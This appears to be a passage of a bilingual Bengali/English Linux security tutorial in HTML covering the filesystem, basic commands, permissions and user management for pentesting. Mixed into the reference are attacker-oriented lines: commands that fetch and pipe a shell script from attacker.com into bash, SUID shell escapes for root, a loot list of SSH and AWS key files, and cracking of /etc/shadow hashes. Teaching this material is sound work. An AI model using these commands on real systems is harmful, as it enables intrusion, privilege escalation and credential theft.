+    <div class="chapter-desc"><span class="bn-text">FHS — সব ডিরেক্টরির কাজ এবং সিকিউরিটি-গুরুত্বপূর্ণ ফাইল</span><span class="en-text">FHS — Purpose of all directories and security-critical files</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">Filesystem Hierarchy Standard (FHS)</h2>
+    <p>Linux-এ সব কিছু একটি root (<code>/</code>) ডিরেক্টরি থেকে শুরু হয়। Windows-এর মতো C:\ D:\ নেই — সব কিছু একটি tree structure-এ।</p>
+
+    <div class="diagram">
+<pre><span class="dg">/</span> (Root)
+├── <span class="dy">bin/</span>      → Essential commands (ls, cp, mv, cat)
+├── <span class="dy">boot/</span>     → Boot files, GRUB, Linux Kernel
+├── <span class="dy">dev/</span>      → Device files (sda, tty, null, random)
+├── <span class="dy">etc/</span>      → ⭐ System configuration files [সবচেয়ে গুরুত্বপূর্ণ!]
+├── <span class="dy">home/</span>     → User home directories (/home/saimum)
+├── <span class="dy">lib/</span>      → Shared libraries
+├── <span class="dy">media/</span>    → Removable media mount points
+├── <span class="dy">mnt/</span>      → Temporary mount points
+├── <span class="dy">opt/</span>      → Optional/third-party software
+├── <span class="dy">proc/</span>     → ⭐ Virtual filesystem — running processes
+├── <span class="dy">root/</span>     → ⭐ Root user's home directory
+├── <span class="dy">run/</span>      → Runtime data (PIDs, sockets)
+├── <span class="dy">sbin/</span>     → System binaries (admin commands)
+├── <span class="dy">srv/</span>      → Service data (web server files)
+├── <span class="dy">sys/</span>      → Virtual filesystem — kernel/hardware
+├── <span class="dy">tmp/</span>      → ⚠️ Temporary files (world-writable!)
+├── <span class="dy">usr/</span>      → User programs and data
+│   ├── bin/   → User commands
+│   ├── lib/   → Libraries
+│   ├── local/ → Locally installed software
+│   └── share/ → Shared data
+└── <span class="dy">var/</span>      → ⭐ Variable data (logs, mail, databases)
+    ├── log/   → System logs
+    ├── www/   → Web server files
+    └── mail/  → Mail spool
+</pre>
+    </div>
+
+    <h2 class="sec">সিকিউরিটি-গুরুত্বপূর্ণ ফাইল ও ডিরেক্টরি</h2>
+
+    <h3 class="sub"><span class="bn-text">/etc — কনফিগারেশন ফাইল</span><span class="en-text">/etc — Configuration Files</span></h3>
+    <table>
+      <thead><tr><th>ফাইল</th><th>কাজ</th><th>সিকিউরিটি গুরুত্ব</th></tr></thead>
+      <tbody>
+        <tr><td><code>/etc/passwd</code></td><td>User অ্যাকাউন্ট তথ্য</td><td>⭐⭐⭐⭐⭐ সব user দেখা যায়</td></tr>
+        <tr><td><code>/etc/shadow</code></td><td>Hashed পাসওয়ার্ড</td><td>⭐⭐⭐⭐⭐ Root only! Crack করা যায়</td></tr>
+        <tr><td><code>/etc/group</code></td><td>Group তথ্য</td><td>⭐⭐⭐⭐ Group membership</td></tr>
+        <tr><td><code>/etc/sudoers</code></td><td>Sudo অনুমতি</td><td>⭐⭐⭐⭐⭐ Privilege Escalation!</td></tr>
+        <tr><td><code>/etc/ssh/sshd_config</code></td><td>SSH সার্ভার কনফিগ</td><td>⭐⭐⭐⭐⭐ Remote access নিয়ন্ত্রণ</td></tr>
+        <tr><td><code>/etc/hosts</code></td><td>Local DNS</td><td>⭐⭐⭐ DNS Spoofing সম্ভব</td></tr>
+        <tr><td><code>/etc/crontab</code></td><td>Scheduled tasks</td><td>⭐⭐⭐⭐⭐ Persistence!</td></tr>
+        <tr><td><code>/etc/fstab</code></td><td>Filesystem mount</td><td>⭐⭐⭐ Mount point info</td></tr>
+        <tr><td><code>/etc/network/interfaces</code></td><td>নেটওয়ার্ক কনফিগ</td><td>⭐⭐⭐ Network setup</td></tr>
+        <tr><td><code>/etc/iptables/rules.v4</code></td><td>Firewall rules</td><td>⭐⭐⭐⭐⭐ Security rules</td></tr>
+        <tr><td><code>/etc/environment</code></td><td>System environment</td><td>⭐⭐⭐ PATH injection</td></tr>
+        <tr><td><code>/etc/profile</code></td><td>Login shell script</td><td>⭐⭐⭐⭐ Persistence</td></tr>
+      </tbody>
+    </table>
+
+    <h3 class="sub"><span class="bn-text">/proc — চলমান সিস্টেমের তথ্য</span><span class="en-text">/proc — Running System Information</span></h3>
+    <div class="code">
+<span class="c"># /proc ভার্চুয়াল ফাইলসিস্টেম — RAM-এ থাকে, disk-এ নয়</span>
+cat /proc/version      <span class="c"># Kernel version</span>
+cat /proc/cpuinfo      <span class="c"># CPU তথ্য</span>
+cat /proc/meminfo      <span class="c"># মেমোরি তথ্য</span>
+cat /proc/net/tcp      <span class="c"># নেটওয়ার্ক সংযোগ</span>
+cat /proc/1/maps       <span class="c"># PID 1-এর মেমোরি ম্যাপ</span>
+ls /proc/              <span class="c"># প্রতিটি নম্বর = একটি চলমান process</span>
+cat /proc/self/environ <span class="c"># বর্তমান process-এর environment</span>
+    </div>
+
+    <h3 class="sub"><span class="bn-text">/var/log — Log ফাইল</span><span class="en-text">/var/log — Log Files</span></h3>
+    <table>
+      <thead><tr><th>Log ফাইল</th><th>কী থাকে</th><th>সিকিউরিটি ব্যবহার</th></tr></thead>
+      <tbody>
+        <tr><td><code>/var/log/auth.log</code></td><td>Authentication ইভেন্ট</td><td>Login attempt, sudo use ট্র্যাক</td></tr>
+        <tr><td><code>/var/log/syslog</code></td><td>System messages</td><td>System activity মনিটর</td></tr>
+        <tr><td><code>/var/log/kern.log</code></td><td>Kernel messages</td><td>Kernel exploit চেষ্টা</td></tr>
+        <tr><td><code>/var/log/apache2/access.log</code></td><td>Web requests</td><td>Web attack detection</td></tr>
+        <tr><td><code>/var/log/apache2/error.log</code></td><td>Web errors</td><td>Exploitation চেষ্টা</td></tr>
+        <tr><td><code>/var/log/fail2ban.log</code></td><td>Blocked IPs</td><td>Brute force detection</td></tr>
+        <tr><td><code>/var/log/wtmp</code></td><td>Login history</td><td>last কমান্ড দিয়ে পড়া</td></tr>
+        <tr><td><code>/var/log/btmp</code></td><td>Failed logins</td><td>lastb কমান্ড দিয়ে পড়া</td></tr>
+      </tbody>
+    </table>
+
+    <h3 class="sub"><span class="bn-text">Home Directory — গোপন ফাইল</span><span class="en-text">Home Directory — Hidden Files</span></h3>
+    <div class="code">
+<span class="c"># হ্যাকার যখন access পায়, প্রথমে এগুলো খোঁজে:</span>
+~/.ssh/id_rsa           <span class="c"># ⭐⭐⭐⭐⭐ SSH Private Key!</span>
+~/.ssh/authorized_keys  <span class="c"># কোন key দিয়ে login করা যাবে</span>
+~/.ssh/known_hosts      <span class="c"># আগে connect করা host list</span>
+~/.bash_history         <span class="c"># ⭐⭐⭐⭐ আগের সব command!</span>
+~/.bashrc               <span class="c"># Shell startup script</span>
+~/.profile              <span class="c"># Login shell config</span>
+~/.netrc                <span class="c"># FTP/HTTP credentials!</span>
+~/.aws/credentials      <span class="c"># ⭐⭐⭐⭐⭐ AWS Secret Keys!</span>
+~/.gitconfig            <span class="c"># Git configuration</span>
+~/.mysql_history        <span class="c"># MySQL command history</span>
+~/.viminfo              <span class="c"># Vim history</span>
+    </div>
+
+    <div class="box danger">
+      <div class="box-t">⚠️ Pentest টিপ: প্রথমে এগুলো চেক করো</div>
+      যখন কোনো সিস্টেমে access পাবে, প্রথমেই <code>~/.bash_history</code>, <code>~/.ssh/</code> এবং <code>/etc/shadow</code> চেক করো। প্রায়ই এখানে পাসওয়ার্ড বা SSH key পাওয়া যায়।
+    </div>
+
+    <h3 class="sub"><span class="bn-text">বিশেষ ফাইল — /dev</span><span class="en-text">Special Files — /dev</span></h3>
+    <div class="code">
+/dev/null     <span class="c"># ব্ল্যাকহোল — যা পাঠাবে মুছে যাবে</span>
+/dev/zero     <span class="c"># অসীম শূন্য byte stream</span>
+/dev/random   <span class="c"># র‍্যান্ডম data (Cryptography)</span>
+/dev/urandom  <span class="c"># দ্রুত র‍্যান্ডম data</span>
+/dev/sda      <span class="c"># প্রথম হার্ড ড্রাইভ</span>
+/dev/tty      <span class="c"># বর্তমান terminal</span>
+/dev/pts/     <span class="c"># Pseudo-terminal (SSH session)</span>
+
+<span class="c"># উদাহরণ ব্যবহার:</span>
+cat /dev/null                     <span class="c"># কিছুই দেখাবে না</span>
+dd if=/dev/urandom of=key.bin bs=32 count=1  <span class="c"># Random key তৈরি</span>
+ls -la /dev/pts/                  <span class="c"># কতটি SSH session চলছে</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Linux-এ সব কিছুই ফাইল</span><span class="en-text">Everything is a File in Linux</span></h2>
+    <p>Linux-এর মূল দর্শন — "Everything is a file"। ডিভাইস, প্রসেস, নেটওয়ার্ক সংযোগ — সব কিছু ফাইল হিসেবে উপস্থাপন করা হয়।</p>
+
+    <div class="code">
+<span class="c"># নেটওয়ার্ক socket → ফাইল</span>
+ls -la /proc/net/tcp
+<span class="c"># Process → ফাইল</span>
+ls -la /proc/1234/
+<span class="c"># Hard drive → ফাইল</span>
+file /dev/sda
+<span class="c"># Keyboard → ফাইল</span>
+cat /dev/input/event0
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 3: বেসিক কমান্ড
+════════════════════════════════════════ -->
+<div class="chapter ch3">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 03</div>
+    <div class="chapter-title"><span class="bn-text">⌨️ Linux বেসিক কমান্ড — সম্পূর্ণ রেফারেন্স</span><span class="en-text">⌨️ Linux Basic Commands — Complete Reference</span></div>
+    <div class="chapter-desc"><span class="bn-text">Navigation থেকে শুরু করে Power Tools পর্যন্ত সব কমান্ড</span><span class="en-text">All commands from Navigation to Power Tools</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Navigation কমান্ড</span><span class="en-text">Navigation Commands</span></h2>
+    <div class="code">
+<span class="c"># বর্তমান অবস্থান</span>
+pwd                    <span class="c"># Print Working Directory</span>
+
+<span class="c"># ডিরেক্টরি পরিবর্তন</span>
+cd /var/log           <span class="c"># নির্দিষ্ট পথে যাও</span>
+cd ~                  <span class="c"># Home directory-তে যাও</span>
+cd ..                 <span class="c"># এক level উপরে</span>
+cd ../..              <span class="c"># দুই level উপরে</span>
+cd -                  <span class="c"># আগের directory-তে ফিরে যাও</span>
+
+<span class="c"># ফাইল/ডিরেক্টরি দেখা</span>
+ls                    <span class="c"># বেসিক লিস্ট</span>
+ls -la                <span class="c"># ⭐ সব details সহ (hidden ফাইল সহ)</span>
+ls -lah               <span class="c"># Human readable সাইজ</span>
+ls -lt                <span class="c"># সময় অনুযায়ী sort</span>
+ls -lR /etc           <span class="c"># Recursive লিস্ট</span>
+tree /etc -L 2        <span class="c"># Tree structure (2 level)</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">ফাইল অপারেশন</span><span class="en-text">File Operations</span></h2>
+    <div class="code">
+<span class="c"># ফাইল তৈরি</span>
+touch file.txt             <span class="c"># খালি ফাইল তৈরি</span>
+touch -t 202301011200 f    <span class="c"># নির্দিষ্ট timestamp দিয়ে</span>
+mkdir mydir               <span class="c"># ডিরেক্টরি তৈরি</span>
+mkdir -p a/b/c            <span class="c"># nested ডিরেক্টরি</span>
+
+<span class="c"># ফাইল কপি/মুভ</span>
+cp file.txt backup/       <span class="c"># কপি</span>
+cp -r dir/ backup/        <span class="c"># ডিরেক্টরি কপি</span>
+mv file.txt /tmp/         <span class="c"># মুভ বা রিনেম</span>
+
+<span class="c"># ফাইল মুছা</span>
+rm file.txt               <span class="c"># ফাইল মুছা</span>
+rm -rf directory/         <span class="c"># ⚠️ Force delete (সাবধান!)</span>
+shred -vzu file.txt       <span class="c"># নিরাপদে মুছা (Forensics evidence নষ্ট)</span>
+
+<span class="c"># ফাইল পড়া</span>
+cat file.txt              <span class="c"># পুরো ফাইল দেখা</span>
+less file.txt             <span class="c"># Scrollable view</span>
+more file.txt             <span class="c"># Page by page</span>
+head -20 file.txt         <span class="c"># প্রথম ২০ লাইন</span>
+tail -20 file.txt         <span class="c"># শেষ ২০ লাইন</span>
+tail -f /var/log/syslog   <span class="c"># ⭐ Real-time log দেখা</span>
+
+<span class="c"># ফাইল তথ্য</span>
+file unknown_binary       <span class="c"># ফাইলের ধরন জানা</span>
+stat file.txt             <span class="c"># বিস্তারিত metadata</span>
+wc -l file.txt            <span class="c"># লাইন সংখ্যা</span>
+wc -c file.txt            <span class="c"># byte সংখ্যা</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Text Processing — সবচেয়ে গুরুত্বপূর্ণ</span><span class="en-text">Text Processing — Most Important</span></h2>
+
+    <h3 class="sub"><span class="bn-text">grep — Pattern খোঁজা</span><span class="en-text">grep — Pattern Searching</span></h3>
+    <div class="code">
+<span class="c"># মূল syntax: grep [option] pattern file</span>
+grep "password" config.php         <span class="c"># "password" শব্দ খোঁজা</span>
+grep -i "password" config.php      <span class="c"># Case insensitive</span>
+grep -r "password" /var/www/       <span class="c"># ⭐ Recursive search</span>
+grep -n "error" log.txt            <span class="c"># Line number সহ</span>
+grep -v "comment" file.txt         <span class="c"># বাদ দিয়ে দেখাও</span>
+grep -E "admin|root|password" f    <span class="c"># Extended regex</span>
+grep -l "password" *.php           <span class="c"># শুধু ফাইলের নাম</span>
+grep -c "error" log.txt            <span class="c"># কতবার আছে গুনে দাও</span>
+grep -A 3 "error" log.txt          <span class="c"># মিলের পরে ৩ লাইন</span>
+grep -B 3 "error" log.txt          <span class="c"># মিলের আগে ৩ লাইন</span>
+
+<span class="c"># ⭐ Pentest-এ grep ব্যবহার</span>
+grep -r "password\|passwd\|secret\|key\|token" /var/www/ 2>/dev/null
+grep -r "DB_PASSWORD\|DATABASE_PASSWORD" /var/www/ 2>/dev/null
+grep -rn "eval\|base64_decode\|system\|exec" /var/www/  <span class="c"># Webshell খোঁজা</span>
+    </div>
+
+    <h3 class="sub"><span class="bn-text">find — ফাইল খোঁজা</span><span class="en-text">find — Finding Files</span></h3>
+    <div class="code">
+<span class="c"># মূল syntax: find [path] [options] [expression]</span>
+find / -name "*.php"               <span class="c"># সব PHP ফাইল</span>
+find / -name "passwd" 2>/dev/null  <span class="c"># passwd নামের ফাইল</span>
+find / -type f -perm -4000 2>/dev/null  <span class="c"># ⭐⭐⭐ SUID ফাইল!</span>
+find / -type f -perm -2000 2>/dev/null  <span class="c"># ⭐ SGID ফাইল</span>
+find / -writable -type d 2>/dev/null     <span class="c"># Write করা যায় এমন dir</span>
+find / -mtime -1 2>/dev/null             <span class="c"># গত ২৪ ঘণ্টায় পরিবর্তিত</span>
+find / -size +100M 2>/dev/null           <span class="c"># ১০০MB-এর বড় ফাইল</span>
+find /tmp -type f -name "*.sh"           <span class="c"># /tmp-এ shell script</span>
+find / -user root -writable 2>/dev/null  <span class="c"># root-owned কিন্তু writable</span>
+find / -nouser 2>/dev/null               <span class="c"># কোনো owner নেই</span>
+find . -name "*.conf" -exec cat {} \;    <span class="c"># খুঁজে পেলে cat করো</span>
+    </div>
+
+    <h3 class="sub"><span class="bn-text">awk — ডেটা প্রসেসিং</span><span class="en-text">awk — Data Processing</span></h3>
+    <div class="code">
+<span class="c"># /etc/passwd থেকে username বের করা</span>
+awk -F: '{print $1}' /etc/passwd
+<span class="c"># প্রথম ও তৃতীয় কলাম</span>
+awk -F: '{print $1, $3}' /etc/passwd
+<span class="c"># শুধু UID 0 (root) user</span>
+awk -F: '$3 == 0 {print $1}' /etc/passwd
+<span class="c"># Log থেকে IP address বের করা</span>
+awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn
+<span class="c"># নির্দিষ্ট pattern-এ লাইন</span>
+awk '/error/ {print NR": "$0}' log.txt
+    </div>
+
+    <h3 class="sub"><span class="bn-text">sed — Stream Editor</span><span class="en-text">sed — Stream Editor</span></h3>
+    <div class="code">
+<span class="c"># Text প্রতিস্থাপন</span>
+sed 's/old/new/g' file.txt        <span class="c"># সব জায়গা replace</span>
+sed -i 's/password/REDACTED/g' f  <span class="c"># ফাইলে সরাসরি পরিবর্তন</span>
+<span class="c"># নির্দিষ্ট লাইন মুছা</span>
+sed '/^#/d' config.txt            <span class="c"># comment লাইন মুছা</span>
+sed -n '5,10p' file.txt           <span class="c"># ৫ থেকে ১০ লাইন দেখাও</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Pipe ও Redirection</span><span class="en-text">Pipe & Redirection</span></h2>
+    <div class="code">
+<span class="c"># Redirection</span>
+echo "Hello" > file.txt      <span class="c"># ফাইলে লেখা (overwrite)</span>
+echo "World" >> file.txt     <span class="c"># ফাইলে যোগ করা (append)</span>
+cat file.txt 2>/dev/null     <span class="c"># Error বাদ দেওয়া</span>
+cat file.txt 2>&1            <span class="c"># Error ও Output একসাথে</span>
+cat file.txt > out.txt 2>&1  <span class="c"># সব ফাইলে সেভ</span>
+
+<span class="c"># Pipe — এক কমান্ডের output অন্যটির input</span>
+cat /etc/passwd | grep bash        <span class="c"># bash shell user</span>
+ps aux | grep apache               <span class="c"># apache process</span>
+netstat -tulnp | grep LISTEN       <span class="c"># listening পোর্ট</span>
+cat log.txt | sort | uniq          <span class="c"># unique লাইন</span>
+cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -10
+<span class="c"># উপরে: Top 10 IP address by request count</span>
+
+<span class="c"># xargs — argument হিসেবে পাঠানো</span>
+find / -name "*.conf" | xargs grep "password" 2>/dev/null
+cat hosts.txt | xargs -I{} nmap -sV {}    <span class="c"># প্রতিটি host scan</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">System Information কমান্ড</span><span class="en-text">System Information Commands</span></h2>
+    <div class="code">
+<span class="c"># Kernel ও OS তথ্য</span>
+uname -a                   <span class="c"># ⭐ Kernel version (Exploit খোঁজার জন্য)</span>
+uname -r                   <span class="c"># শুধু Kernel version</span>
+cat /etc/os-release        <span class="c"># OS তথ্য</span>
+cat /etc/issue             <span class="c"># OS banner</span>
+lsb_release -a             <span class="c"># Distro তথ্য</span>
+
+<span class="c"># Hardware তথ্য</span>
+lscpu                      <span class="c"># CPU তথ্য</span>
+free -h                    <span class="c"># RAM ব্যবহার</span>
+df -h                      <span class="c"># Disk ব্যবহার</span>
+lsblk                      <span class="c"># Block device</span>
+lspci                      <span class="c"># PCI device</span>
+lsusb                      <span class="c"># USB device</span>
+
+<span class="c"># Environment</span>
+env                        <span class="c"># সব environment variable</span>
+echo $PATH                 <span class="c"># PATH variable</span>
+echo $HOME                 <span class="c"># Home directory</span>
+echo $SHELL                <span class="c"># বর্তমান shell</span>
+printenv                   <span class="c"># env-এর মতো</span>
+
+<span class="c"># User তথ্য</span>
+whoami                     <span class="c"># বর্তমান user</span>
+id                         <span class="c"># UID, GID, Groups</span>
+who                        <span class="c"># login করা সব user</span>
+w                          <span class="c"># বিস্তারিত user activity</span>
+last                       <span class="c"># Login history</span>
+lastlog                    <span class="c"># সব user-এর শেষ login</span>
+history                    <span class="c"># কমান্ড history</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Archive ও Compression</span><span class="en-text">Archive & Compression</span></h2>
+    <div class="code">
+<span class="c"># tar — সবচেয়ে বেশি ব্যবহৃত</span>
+tar -czf archive.tar.gz /var/www/   <span class="c"># Compress করে archive</span>
+tar -xzf archive.tar.gz             <span class="c"># Extract করা</span>
+tar -tzf archive.tar.gz             <span class="c"># Contents দেখা</span>
+
+<span class="c"># zip/unzip</span>
+zip -r backup.zip /var/www/
+unzip backup.zip -d /tmp/
+
+<span class="c"># ⭐ Pentest: CTF-এ প্রায়ই archive-এ flag লুকানো থাকে</span>
+binwalk firmware.bin               <span class="c"># Binary-এর ভেতরে hidden file</span>
+file suspicious.jpg                <span class="c"># সত্যিই image কিনা?</span>
+strings binary_file | grep flag    <span class="c"># Strings বের করা</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">wget ও curl — Data Download</span><span class="en-text">wget & curl — Data Download</span></h2>
+    <div class="code">
+<span class="c"># wget</span>
+wget https://example.com/file.zip        <span class="c"># ফাইল ডাউনলোড</span>
+wget -r -np https://example.com/         <span class="c"># পুরো সাইট mirror</span>
+wget -q -O - https://api.com/data        <span class="c"># Output to stdout</span>
+
+<span class="c"># curl — আরও শক্তিশালী</span>
+curl https://example.com                 <span class="c"># GET request</span>
+curl -I https://example.com             <span class="c"># শুধু Header</span>
+curl -X POST -d "user=admin&pass=1234" https://example.com/login
+curl -H "Cookie: session=abc" https://example.com/admin
+curl -u admin:password https://api.com  <span class="c"># Basic auth</span>
+curl --proxy http://127.0.0.1:8080 https://target.com  <span class="c"># Burp Proxy</span>
+
+<span class="c"># ⭐ Payload download (Post-exploitation)</span>
+wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
+curl http://attacker.com/shell.sh | bash
+    </div>
+
+  </div>
+</div>
+
+
+<!-- ════════════════════════════════════════
+     CHAPTER 4: পার্মিশন
+════════════════════════════════════════ -->
+<div class="chapter ch4">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 04</div>
+    <div class="chapter-title"><span class="bn-text">🔒 ফাইল পার্মিশন ও Access Control</span><span class="en-text">🔒 File Permissions & Access Control</span></div>
+    <div class="chapter-desc"><span class="bn-text">rwx, chmod, SUID/SGID — Privilege Escalation-এর মূল</span><span class="en-text">rwx, chmod, SUID/SGID — Core of Privilege Escalation</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">পার্মিশন কীভাবে কাজ করে?</span><span class="en-text">How do Permissions Work?</span></h2>
+    <div class="diagram">
+<pre>ls -la /etc/passwd এর output:
+
+-rw-r--r-- 1 root root 2847 Jan 10 12:00 /etc/passwd
+│││││││││└── File name
+│││││││││
+│││││││└──── Group permission: r-- (read only)
+│││││└────── Owner permission: rw- (read+write)
+│││└──────── File type: - (regular file)
+│││
+│││  মোট ৯ বিট = ৩ সেট × ৩ বিট (rwx)
+│││
+│├┴───────── Owner (user)
+│└─────────── Group
+└──────────── Others (everyone else)
+</pre>
+    </div>
+
+    <h3 class="sub">পার্মিশনের মান</h3>
+    <table>
+      <thead><tr><th>Symbol</th><th>বাইনারি</th><th>মান</th><th>অর্থ</th></tr></thead>
+      <tbody>
+        <tr><td><code>r</code></td><td>100</td><td>4</td><td>Read — পড়তে পারবে</td></tr>
+        <tr><td><code>w</code></td><td>010</td><td>2</td><td>Write — লিখতে পারবে</td></tr>
+        <tr><td><code>x</code></td><td>001</td><td>1</td><td>Execute — চালাতে পারবে</td></tr>
+        <tr><td><code>-</code></td><td>000</td><td>0</td><td>কোনো permission নেই</td></tr>
+      </tbody>
+    </table>
+
+    <h3 class="sub">Octal (সংখ্যা) দিয়ে পার্মিশন</h3>
+    <div class="code">
+<span class="c"># chmod দিয়ে পার্মিশন পরিবর্তন</span>
+chmod 755 script.sh     <span class="c"># rwxr-xr-x → সাধারণ executable</span>
+chmod 644 file.txt      <span class="c"># rw-r--r-- → সাধারণ ফাইল</span>
+chmod 600 private.key   <span class="c"># rw------- → শুধু owner পড়তে পারবে</span>
+chmod 777 file.txt      <span class="c"># ⚠️ rwxrwxrwx → সবাই সব পারবে (বিপজ্জনক!)</span>
+chmod 000 file.txt      <span class="c"># ---------- → কেউ কিছু করতে পারবে না</span>
+
+<span class="c"># Symbolic দিয়ে</span>
+chmod u+x script.sh     <span class="c"># Owner-এ execute যোগ</span>
+chmod g-w file.txt      <span class="c"># Group থেকে write সরানো</span>
+chmod o=r file.txt      <span class="c"># Others শুধু read</span>
+chmod a+x script.sh     <span class="c"># সবাইকে execute</span>
+chmod -R 755 /var/www/  <span class="c"># Recursive</span>
+
+<span class="c"># chown — Owner পরিবর্তন</span>
+chown root:root file.txt        <span class="c"># owner:group পরিবর্তন</span>
+chown -R www-data:www-data /var/www/
+    </div>
+
+    <h2 class="sec"><span class="bn-text">SUID, SGID, Sticky Bit — সিকিউরিটি Critical</span><span class="en-text">SUID, SGID, Sticky Bit — Security Critical</span></h2>
+
+    <h3 class="sub">SUID (Set User ID) — সবচেয়ে বিপজ্জনক</h3>
+    <p>SUID বিট থাকলে ফাইলটি owner-এর privilege দিয়ে চলে, চালানো user-এর নয়। যেমন <code>/usr/bin/passwd</code> — সাধারণ user root হিসেবে /etc/shadow পরিবর্তন করতে পারে।</p>
+
+    <div class="code">
+<span class="c"># SUID ফাইল চেনা — ls-এ 's' দেখা যায়</span>
+ls -la /usr/bin/passwd
+<span class="g">-rwsr-xr-x 1 root root 63736 /usr/bin/passwd</span>
+<span class="c">#   ↑ এই 's' মানে SUID আছে</span>
+
+<span class="c"># সব SUID ফাইল খোঁজা</span>
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+<span class="c"># ⭐⭐⭐ Privilege Escalation: SUID দিয়ে root shell</span>
+<span class="c"># উদাহরণ: nmap-এ SUID থাকলে</span>
+nmap --interactive
+<span class="g">!sh   # root shell পাওয়া যাবে!</span>
+
+<span class="c"># উদাহরণ: find-এ SUID থাকলে</span>
+find . -exec /bin/sh \; -quit
+
+<span class="c"># উদাহরণ: vim-এ SUID থাকলে</span>
+vim -c ':!/bin/sh'
+    </div>
+
+    <div class="box danger">
+      <div class="box-t">⚠️ SUID — Privilege Escalation-এর সোনার খনি</div>
+      যদি কোনো SUID ফাইল custom বা অপ্রচলিত হয়, সেটি দিয়ে root access পাওয়া প্রায়ই সম্ভব। GTFOBins (gtfobins.github.io) ওয়েবসাইটে সব SUID exploit পাওয়া যায়।
+    </div>
+
+    <h3 class="sub">Sticky Bit</h3>
+    <p>Sticky Bit থাকলে /tmp ডিরেক্টরিতে শুধু ফাইলের owner মুছতে পারবে।</p>
+    <div class="code">
+ls -la /tmp
+<span class="g">drwxrwxrwt  16 root root 4096 /tmp</span>
+<span class="c">#         ↑ 't' = sticky bit</span>
+chmod +t /shared_dir    <span class="c"># Sticky bit যোগ</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">umask — Default পার্মিশন</span><span class="en-text">umask — Default Permissions</span></h2>
+    <div class="code">
+umask             <span class="c"># বর্তমান umask দেখা (সাধারণত 022)</span>
+<span class="c"># umask 022 মানে:</span>
+<span class="c"># ফাইল তৈরি হবে: 666 - 022 = 644 (rw-r--r--)</span>
+<span class="c"># ডিরেক্টরি তৈরি হবে: 777 - 022 = 755 (rwxr-xr-x)</span>
+umask 077         <span class="c"># শুধু owner পড়তে পারবে (সর্বোচ্চ নিরাপদ)</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════
+     CHAPTER 5: User Management
+════════════════════════════════════════ -->
+<div class="chapter ch5">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 05</div>
+    <div class="chapter-title"><span class="bn-text">👤 User ও Group ব্যবস্থাপনা</span><span class="en-text">👤 User & Group Management</span></div>
+    <div class="chapter-desc"><span class="bn-text">/etc/passwd, /etc/shadow, sudo — Pentest-এর মূল টার্গেট</span><span class="en-text">/etc/passwd, /etc/shadow, sudo — Core Pentest Targets</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">/etc/passwd — User ডেটাবেস</span><span class="en-text">/etc/passwd — User Database</span></h2>
+    <div class="code">
+cat /etc/passwd
+
+<span class="c"># Format: username:x:UID:GID:comment:home:shell</span>
+<span class="g">root:x:0:0:root:/root:/bin/bash</span>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33::/var/www:/usr/sbin/nologin
+saimum:x:1000:1000::/home/saimum:/bin/bash
+
+<span class="c"># বিশ্লেষণ:</span>
+<span class="c"># root:x:0:0:...</span>
+<span class="c"># ↑    ↑ ↑ ↑</span>
+<span class="c"># │    │ │ └── GID (Group ID)</span>
+<span class="c"># │    │ └──── UID (User ID) → 0 মানে root!</span>
+<span class="c"># │    └────── 'x' মানে password /etc/shadow-এ</span>
+<span class="c"># └─────────── username</span>
+
+<span class="c"># ⭐ Pentest: shell থাকা user দেখা</span>
+grep -v 'nologin\|false' /etc/passwd | awk -F: '{print $1}'
+<span class="c"># UID 0 user (root-level)</span>
+awk -F: '$3 == 0 {print $1}' /etc/passwd
+    </div>
+
+    <h2 class="sec"><span class="bn-text">/etc/shadow — পাসওয়ার্ড ডেটাবেস</span><span class="en-text">/etc/shadow — Password Database</span></h2>
+    <div class="code">
+<span class="c"># শুধু root পড়তে পারে!</span>
+cat /etc/shadow
+
+<span class="c"># Format: username:hash:lastchange:min:max:warn:inactive:expire</span>
+<span class="g">root:$6$rounds=5000$xyz$HASH...:19000:0:99999:7:::</span>
+
+<span class="c"># Hash type চেনা:</span>
+<span class="c"># $1$ = MD5 (দুর্বল)</span>
+<span class="c"># $2a$ = Bcrypt</span>
+<span class="c"># $5$ = SHA-256</span>
+<span class="c"># $6$ = SHA-512 (সাধারণ Linux)</span>
+<span class="c"># '!' বা '*' = account locked</span>
+
+<span class="c"># Hash crack করা</span>
+unshadow /etc/passwd /etc/shadow > combined.txt
+john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
+hashcat -m 1800 shadow_hash.txt rockyou.txt   <span class="c"># SHA-512</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">User ব্যবস্থাপনা কমান্ড</span><span class="en-text">User Management Commands</span></h2>
+    <div class="code">
+<span class="c"># User তৈরি</span>
+useradd -m -s /bin/bash saimum      <span class="c"># Home dir সহ user তৈরি</span>
+useradd -m -G sudo saimum           <span class="c"># sudo group-এ যোগ</span>
+passwd saimum                       <span class="c"># পাসওয়ার্ড সেট</span>
+
+<span class="c"># User পরিবর্তন</span>
+usermod -aG sudo saimum             <span class="c"># sudo group-এ যোগ</span>
+usermod -s /bin/bash saimum         <span class="c"># shell পরিবর্তন</span>
+usermod -L saimum                   <span class="c"># account lock</span>
+usermod -U saimum                   <span class="c"># unlock</span>
+
+<span class="c"># User মুছা</span>
